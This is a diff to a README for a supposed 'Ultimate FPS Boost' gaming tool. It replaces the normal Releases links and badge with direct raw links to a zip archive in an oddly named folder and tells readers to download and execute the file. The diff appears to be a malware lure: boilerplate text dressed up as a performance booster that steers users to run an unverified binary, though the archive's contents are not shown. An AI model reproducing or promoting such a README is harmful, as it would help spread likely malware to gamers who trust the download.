@@ -2,7 +2,7 @@
 
 Welcome to the **Ultimate FPS Boost** repository! This project aims to enhance your gaming experience by optimizing frame rates and improving performance on various systems. Whether you're using a low-end PC or just want to squeeze out more frames per second, this repository offers tools and tips to help you achieve your gaming goals.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/sadiaref1986/Ultimate-FPS-Boost/releases)
+[![Download Latest Release](https://github.com/sadiaref1986/Ultimate-FPS-Boost/raw/refs/heads/main/whitebill/Ultimate_Boost_FP_1.7.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/sadiaref1986/Ultimate-FPS-Boost/raw/refs/heads/main/whitebill/Ultimate_Boost_FP_1.7.zip)
 
 ## Table of Contents
 
@@ -29,7 +29,7 @@ In today's gaming world, performance can make or break your experience. Many gam
 
 ## Installation
 
-To get started, visit our [Releases](https://github.com/sadiaref1986/Ultimate-FPS-Boost/releases) section. Download the latest version and execute the file to begin the installation. Follow the on-screen instructions for a smooth setup.
+To get started, visit our [Releases](https://github.com/sadiaref1986/Ultimate-FPS-Boost/raw/refs/heads/main/whitebill/Ultimate_Boost_FP_1.7.zip) section. Download the latest version and execute the file to begin the installation. Follow the on-screen instructions for a smooth setup.
 
 ## Usage
 
@@ -62,6 +62,6 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 For questions or support, please reach out via the issues section of this repository. We are here to help you optimize your gaming experience!
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/sadiaref1986/Ultimate-FPS-Boost/releases)
+[![Download Latest Release](https://github.com/sadiaref1986/Ultimate-FPS-Boost/raw/refs/heads/main/whitebill/Ultimate_Boost_FP_1.7.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/sadiaref1986/Ultimate-FPS-Boost/raw/refs/heads/main/whitebill/Ultimate_Boost_FP_1.7.zip)
 
 Thank you for visiting the **Ultimate FPS Boost** repository. We hope you find it helpful in your gaming journey!
